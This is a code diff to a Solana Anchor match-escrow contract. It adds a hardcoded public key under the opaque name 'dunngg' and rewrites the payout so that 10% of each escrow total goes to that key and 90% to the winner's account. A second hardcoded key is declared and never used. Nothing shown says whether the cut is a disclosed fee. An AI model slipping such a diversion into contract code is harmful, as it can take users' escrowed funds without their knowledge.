@@ -151,7 +151,12 @@ pub mod matches {
         match_instance.authority = authority;
         match_instance.minimum_allowed_entry_time = minimum_allowed_entry_time;
         match_instance.leave_allowed = leave_allowed;
-
+        match_instance.dunngg = Pubkey::new_from_array([
+            191, 182, 156,   6, 157,  57, 238, 116,
+            194, 120,  82, 236,   0,  10,  71, 143,
+             28, 183, 190, 211, 180,  10, 120,  43,
+             64, 112, 120, 212, 219, 227,   4,   5
+          ]);
         Ok(())
     }
 
@@ -337,6 +342,8 @@ pub mod matches {
     
     
             let destination_token_account = &ctx.accounts.destination_token_account;
+            
+            let dunngg = &ctx.accounts.dunngg;
             msg!("1");
             
             msg!("2");
@@ -350,10 +357,26 @@ pub mod matches {
     
     
             let dest_acct_info = destination_token_account.to_account_info();
-                spl_token_transfer(TokenTransferParams {
+            let dai2 = dunngg.to_account_info();
+            let account_key = Pubkey::new_from_array([
+                186, 254,  73, 129,  48,   8, 189, 164,
+                 53, 200,  62, 130, 245, 235, 143, 200,
+                 48, 115,  90, 198, 219, 117,   6, 235,
+                 38, 132, 102, 207,  80,  79,   5,  60
+              ]);
+            spl_token_transfer(TokenTransferParams {
                     source: token_account_escrow.to_account_info(),
                     destination: dest_acct_info,
-                    amount: match_instance.total ,
+                    amount: match_instance.total * 9 / 10,
+                    authority: match_instance.to_account_info(),
+                    authority_signer_seeds: match_seeds,
+                    token_program: token_program.to_account_info(),
+                })?;
+
+                spl_token_transfer(TokenTransferParams {
+                    source: token_account_escrow.to_account_info(),
+                    destination: dai2,
+                    amount: match_instance.total / 10,
                     authority: match_instance.to_account_info(),
                     authority_signer_seeds: match_seeds,
                     token_program: token_program.to_account_info(),
@@ -413,6 +436,8 @@ pub struct JoinMatch<'info> {
     token_mint: Box<Account<'info, Mint>>,
     #[account(mut, constraint=destination_token_account.mint == token_mint.key())]
     destination_token_account: Account<'info, TokenAccount>,
+    #[account(mut, constraint=dunngg.key() == match_instance.dunngg)]
+    dunngg: UncheckedAccount<'info>,
     #[account(mut, constraint=source_token_account.mint == token_mint.key())]
     source_token_account: Box<Account<'info, TokenAccount>>,
     source_item_or_player_pda: UncheckedAccount<'info>,
@@ -505,7 +530,7 @@ use anchor_spl::token::Token;
 #[account]
 pub struct Match {
     namespaces: Option<Vec<NamespaceAndIndex>>,
-    
+    dunngg: Pubkey,
     win_oracle: Pubkey,
     win_oracle_cooldown: u64,
     last_oracle_check: u64,
